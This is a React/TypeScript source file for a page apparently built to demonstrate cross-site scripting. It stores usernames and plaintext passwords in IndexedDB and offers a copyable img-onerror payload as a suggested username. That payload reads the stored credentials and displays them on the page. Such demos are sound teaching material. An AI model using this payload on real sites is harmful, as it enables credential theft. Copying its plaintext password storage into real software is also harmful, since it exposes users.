import { useEffect, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { useForm } from "react-hook-form";
import { openDB, DBSchema } from "idb";
import { Transition } from "@headlessui/react";

import { Snackbar, useSnackbar, Tooltip } from ".";
import { DocumentCopy, LinkArrow } from "./svgs";

interface MyDB extends DBSchema {
  users: {
    key: number;
    value: {
      username: string;
      password: string;
    };
    indexes: {
      username: string;
      password: string;
    };
  };
}

const dbName = "users_database";

const listHeading = (
  <h2 className="ml-5 font-semibold uppercase tracking-wide text-white">
    List of users
  </h2>
);

async function createDatabase() {
  const db = await openDB<MyDB>(dbName, 2, {
    upgrade(db) {
      // Create a store of objects
      const store = db.createObjectStore("users", {
        // The 'id' property of the object will be the key.
        keyPath: "id",
        // If it isn't explicitly set, create a value by auto incrementing.
        autoIncrement: true,
      });
      // Create an index on the 'date' property of the objects.
      store.createIndex("username", "username", { unique: true });
      store.createIndex("password", "password");
    },
  });

  return db;
}

interface State {
  username: string;
  password: string;
}

const initialState = {
  username: "",
  password: "",
};

const Home = () => {
  const [users, setUsers] = useState<State[]>([]);

  useEffect(() => {
    const doStuff = async () => {
      const db = await createDatabase();
      const promise = await db.getAll("users");
      const length = await promise.length;
      if (length === 0) {
        await db.add("users", {
          username: "davidMurdoch",
          password: "hunter2",
        });
        await db.add("users", {
          username: "newUser",
          password: "test",
        });
      }

      // const tx = db.transaction("users");

      // for await (const cursor of db.transaction("users").store) {
      //   console.log(cursor.index);
      //   cursor.continue();
      // }

      setUsers(await db.getAll("users"));
    };
    doStuff();
    // return () => {
    //   const clearIdb = async () => {
    //     const db = await createDatabase();
    //     await db.clear();
    //   };
    //   clearIdb();
    // };
  }, []);

  const { register, handleSubmit, reset } = useForm({
    defaultValues: initialState,
  });

  const onSubmit = async (data: State) => {
    const db = await createDatabase();
    await db.add("users", data);
    setUsers((prevState) => [...prevState, data]);
    reset(initialState, {
      keepDirtyValues: false,
      // dirtyFields: false, // dirtyFields will not be reset
      keepDirty: false, // dirty will not be reset
      keepIsSubmitted: false,
      keepTouched: false,
      keepIsValid: false,
      keepSubmitCount: false,
    });
  };

  const { handleOpen } = useSnackbar();

  const suggestionRef = useRef<HTMLElement>(null);

  const [isOpen, setOpen] = useState<boolean>(false);

  return (
    <>
      <div className="flex min-h-screen overflow-hidden bg-gray-100">
        <Transition show={isOpen}>
          <div className="h-full md:hidden">
            <div className="fixed inset-0 z-40 flex">
              <Transition.Child
                enter="transition-opacity ease-linear duration-300"
                enterFrom="opacity-0"
                enterTo="opacity-100"
                leave="transition-opacity ease-linear duration-300"
                leaveFrom="opacity-100"
                leaveTo="opacity-0"
              >
                <div className="fixed inset-0" aria-hidden="true">
                  <div
                    className="absolute inset-0 bg-gray-600 opacity-75"
                    onClick={() => setOpen(false)}
                  />
                </div>
              </Transition.Child>
              <Transition.Child
                enter="transition ease-in-out duration-300 transform"
                enterFrom="-translate-x-full"
                enterTo="translate-x-0"
                leave="transition ease-in-out duration-300 transform"
                leaveFrom="translate-x-0"
                leaveTo="-translate-x-full"
              >
                <div className="relative flex h-full w-full max-w-xs flex-1 flex-col bg-indigo-700">
                  <div className="absolute right-0 top-0 -mr-12 pt-2">
                    <button
                      className="ml-1 flex h-10 w-10 items-center justify-center rounded-full focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white"
                      onClick={() => setOpen(false)}
                    >
                      <span className="sr-only">Close sidebar</span>

                      <svg
                        className="h-6 w-6 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                        aria-hidden="true"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          d="M6 18L18 6M6 6l12 12"
                        />
                      </svg>
                    </button>
                  </div>
                  <div className="h-0 flex-1 overflow-y-auto pb-4 pt-5">
                    <div className="flex flex-shrink-0 items-center px-4">
                      <img
                        className="h-8 w-auto"
                        src="https://tailwindui.com/img/logos/workflow-logo-indigo-300-mark-white-text.svg"
                        alt="Workflow"
                      />
                    </div>
                    <nav className="mt-5 space-y-1 px-2">
                      {listHeading}
                      {users.map(({ username }, index) => (
                        <Link
                          to={`/${username}`}
                          key={`${username}-${index}-mobile-list`}
                          className="flex items-center rounded-md px-2 py-2 text-base font-medium text-white hover:bg-indigo-600 hover:bg-opacity-75"
                        >
                          <LinkArrow className="mr-4 h-6 w-6 text-indigo-300" />
                          {username}
                        </Link>
                      ))}
                    </nav>
                  </div>
                </div>
                <div className="w-14 flex-shrink-0" aria-hidden="true" />
              </Transition.Child>
            </div>
          </div>
        </Transition>

        <div className="hidden bg-indigo-700 md:flex md:flex-shrink-0">
          <div className="flex w-64 flex-col">
            <div className="flex h-0 flex-1 flex-col">
              <div className="flex flex-1 flex-col overflow-y-auto pb-4 pt-5">
                <nav className="mt-5 flex-1 space-y-1 px-2">
                  {listHeading}
                  {users.map(({ username }, index) => (
                    <Link
                      to={`/${username}`}
                      key={`${username}-${index}-list`}
                      className="flex items-center rounded-md px-2 py-2 text-sm font-medium text-white hover:bg-indigo-600 hover:bg-opacity-75"
                    >
                      <LinkArrow className="mr-4 h-6 w-6 text-indigo-300" />
                      {username}
                    </Link>
                  ))}
                </nav>
              </div>
            </div>
          </div>
        </div>
        <div className="flex w-0 flex-1 flex-col overflow-hidden">
          <div className="pl-1 pt-1 sm:pl-3 sm:pt-3 md:hidden">
            <button
              className="-ml-0.5 -mt-0.5 inline-flex h-12 w-12 items-center justify-center rounded-md text-gray-500 hover:text-gray-900 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-indigo-500"
              onClick={() => setOpen(true)}
            >
              <span className="sr-only">Open sidebar</span>

              <svg
                className="h-6 w-6"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
                aria-hidden="true"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M4 6h16M4 12h16M4 18h16"
                />
              </svg>
            </button>
          </div>

          <main className="flex w-full flex-col justify-center bg-gray-100 py-12 sm:px-6 lg:px-8">
            <div className="sm:mx-auto sm:w-full sm:max-w-md">
              <h2 className="text-center text-base font-semibold uppercase tracking-wide text-indigo-600">
                XSS example
              </h2>

              <h2 className="mt-6 text-center text-3xl font-extrabold text-gray-900">
                Create new account
              </h2>
            </div>

            <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-md">
              <div className="bg-white px-4 py-8 shadow sm:rounded-lg sm:px-10">
                <form className="space-y-6" onSubmit={handleSubmit(onSubmit)}>
                  <div>
                    <label
                      htmlFor="email"
                      className="block text-sm font-medium text-gray-700"
                    >
                      Username
                    </label>
                    <div className="mt-1">
                      <textarea
                        id="username"
                        {...register("username", {
                          required: true,
                        })}
                        className="block w-full appearance-none rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
                      />
                    </div>
                    <div className="flex">
                      <Tooltip tooltipNode="Copy">
                        <button
                          className="rounded-full p-4 hover:bg-gray-200"
                          type="button"
                          onClick={async () => {
                            if (suggestionRef.current) {
                              await navigator.clipboard.writeText(
                                suggestionRef.current.innerText,
                              );
                            }
                            handleOpen();
                          }}
                        >
                          <DocumentCopy className="h-6 w-6" />
                        </button>
                      </Tooltip>
                      <small
                        className="ml-3 text-gray-700"
                        ref={suggestionRef}
                      >{`<img onerror='
                (() => {
                  const request = indexedDB.open("users_database", 2);
                  request.onsuccess = function (event) {
                    const db = event.target.result;
                    const transaction = db.transaction(["users"], "readwrite");
                    const objectStore = transaction.objectStore("users");
                    const contents = objectStore.getAll();
                    contents.onsuccess = (event) => {
                      const data = event.target.result;

                      console.log(data, "data");

                      const main = document.querySelector(".main");

                      const tr = document.createElement("tr");

                      const th1 = document.createElement("th");
                      const th2 = document.createElement("th");

                      th1.classList.add("px-4", "py-2");
                      th2.classList.add("px-4", "py-2");

                      th1.textContent="Username";
                      th2.textContent="Password";

                      const thead = document.createElement("thead");
                      const tbody = document.createElement("tbody");

                      const table = document.createElement("table");
                      const container = document.createElement("div");

                      thead.classList.add("bg-gray-50");

                      table.classList.add("divide-y", "divide-gray-200");

                      container.classList.add("shadow", "overflow-hidden", "border-b", "border-gray-200", "sm:rounded-lg");

                      tr.append(th1);
                      tr.append(th2);

                      thead.append(tr);
                      
                      table.append(thead);

                      for (const { username, password } of data) {
                        const tr = document.createElement("tr");
                        const td1 = document.createElement("td");
                        const td2 = document.createElement("td");

                        td1.classList.add("border", "px-4", "py-2");
                        td2.classList.add("border", "px-4", "py-2");

                        td1.textContent = username;
                        td2.textContent = password;

                        tr.append(td1);
                        tr.append(td2);

                        tbody.append(tr);
                      }

                      table.append(tbody);

                      container.append(table);

                      main.append(container);
                
                    };
                  };
                })();
              ' src='invalid-image'>`}</small>
                    </div>
                  </div>

                  <div>
                    <label
                      htmlFor="password"
                      className="block text-sm font-medium text-gray-700"
                    >
                      Password
                    </label>
                    <div className="mt-1">
                      <input
                        id="password"
                        {...register("password", {
                          required: true,
                        })}
                        type="password"
                        autoComplete="current-password"
                        className="block w-full appearance-none rounded-md border border-gray-300 px-3 py-2 placeholder-gray-400 shadow-sm focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
                      />
                    </div>
                  </div>

                  <div>
                    <button
                      type="submit"
                      className="flex w-full justify-center rounded-md border border-transparent bg-indigo-600 px-4 py-2 text-sm font-medium text-white shadow-sm hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
                    >
                      Continue
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </main>
        </div>
      </div>
      <Snackbar>Copied!</Snackbar>
    </>
  );
};

export { Home };
